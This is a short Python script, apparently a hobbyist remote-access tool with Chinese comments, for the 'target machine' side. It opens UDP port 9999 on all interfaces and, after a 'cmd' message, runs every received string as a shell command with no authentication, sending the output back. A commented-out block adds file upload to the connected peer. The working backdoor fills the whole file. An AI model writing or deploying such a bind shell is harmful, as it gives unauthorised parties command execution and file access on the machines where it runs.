import socket
import subprocess

class qu1 : #靶机
    def __init__(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #接受信息端口
        s.bind(("0.0.0.0",9999)) #开放9999端口
        self.s = s

    def run(self):
        print("等待连接...")
        data,addr = self.s.recvfrom(1270) #data二进制数据，addr：发送端IP，端口
        print("已连接!")

        text_send = b"hi"
        self.s.sendto(text_send, addr)

    def have(self):
        while True:
            data,addr = self.s.recvfrom(1270)
            text_have = data.decode()
            print(text_have)

            if text_have == "exit" :
                break

            if text_have == "cmd" :
                while True :
                    self.s.sendto(b"run", addr)
                    data,addr = self.s.recvfrom(1270)
                    text_have = data.decode()

                    if text_have == "exit" :
                        break

                    result = subprocess.run(text_have, shell=True, capture_output=True, text=True)
                    if result.returncode != 0 :
                        text_send = (f"错误:{result.stderr}")
                    else :
                        text_send = (result.stdout)
                    data = text_send.encode()
                    self.s.sendto(data,addr)












if __name__ == "__main__" :
    q = qu1()
    q.run()
    q.have()
"""
#        text_have = data.decode() #转文字
        #print(text_have)
        text_back = input("发送文件(包括扩展名):")
        data = text_back.encode()
        self.s.sendto(data,addr)
        with open(text_back,"rb") as f:
            f.seek(0,2)
            lens = f.tell()
        send = 60
        read = 0
        while lens > 0 :
            if lens > send :
                with open(text_back,"rb") as f :
                    f.seek(read)
                    data = f.read(send)
                    self.s.sendto(data,addr)
                data,addr = self.s.recvfrom(1270)
                if data == b"ok" :
                    read += send
                    lens -= send
                    print(f"已成功发送{read}字节")

                elif data == b"no" :
                    print("丢包,重新发送!")

                else :
                    print("未知错误!")
            elif lens <= send :
                self.s.sendto(b"end",addr)
                end = lens
                self.s.sendto(str(end).encode(),addr)
                with open(text_back,"rb") as f :
                    f.seek(read)
                    data_to = f.read(lens)
                    self.s.sendto(data_to,addr)
                while True :
                    data,addr = self.s.recvfrom(1270)

                    if data == b"ok" :
                        self.s.sendto(b"over",addr)
                        lens = 0
                        break

                    elif data == b"no" :
                        self.s.sendto(data_to,addr)

        print("发送完毕!")



       # text_back = text_back.encode()
       # self.s.sendto(text_back,addr)
"""